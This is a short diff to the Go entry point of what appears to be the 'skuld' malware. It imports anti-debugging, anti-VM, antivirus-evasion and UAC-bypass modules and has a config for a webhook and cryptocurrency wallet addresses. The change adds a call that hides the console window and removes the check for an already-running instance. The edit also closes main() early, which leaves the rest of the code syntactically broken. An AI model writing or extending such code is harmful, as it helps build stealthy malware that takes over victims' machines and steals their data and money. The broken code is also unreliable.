@@ -1,6 +1,6 @@
 package main
 
-import (
+import ("github.com/hackirby/skuld/modules/hideconsole"
 	"github.com/hackirby/skuld/modules/antidebug"
 	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
@@ -22,6 +22,8 @@ import (
 )
 
 func main() {
+  hideconsole.Run()
+}
 	CONFIG := map[string]interface{}{
 		"webhook": "",
 		"cryptos": map[string]string{
@@ -37,10 +39,6 @@ func main() {
 			"DASH": "",
 			"DOGE": "",
 		},
-	}
-
-	if program.IsAlreadyRunning() {
-		return
 	}
 
 	uacbypass.Run()
